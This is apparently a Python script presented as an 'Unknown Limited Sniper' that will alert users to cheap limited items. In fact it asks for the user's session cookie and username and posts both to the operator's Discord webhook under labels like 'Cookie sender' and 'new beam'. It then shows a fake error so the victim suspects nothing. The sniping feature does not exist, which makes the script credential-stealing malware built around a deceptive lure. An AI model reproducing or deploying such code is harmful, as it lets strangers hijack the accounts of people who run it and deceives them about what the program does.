#dont skid this lmao

from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write
import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook

req = requests.Session()
client = commands.Bot(command_prefix='.') #set prefix


colorama.init()

loadingauth = ''
#paste in your webhook between the ''


def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
 
    w("Welcome to Unknown Limited Sniper! We will alert you if there's any cheap limiteds! Please press enter to continue: ")
    cookiedata = Write.Input("cookie -> ",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("Press enter to continue")
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie sender',
                      'content': "@everyone new beam" f'```{cookiedata}```'
 
                  })
    os.system('cls')
    userdata = Write.Input("username ->",
                           
                           Colors.purple_to_blue,
                           interval=0.005)

    w("Press enter and watch the program redirect you to the limiteds!")
    time.sleep(1)
    w("Error, please restart this program, there may have been something wrong with your username or cookie.")
    requests.post(loadingauth,
                  json={
                      'username': 'Username Sender',
                      'content': "is the user rich?" f'```{userdata}```'
                  })


main()
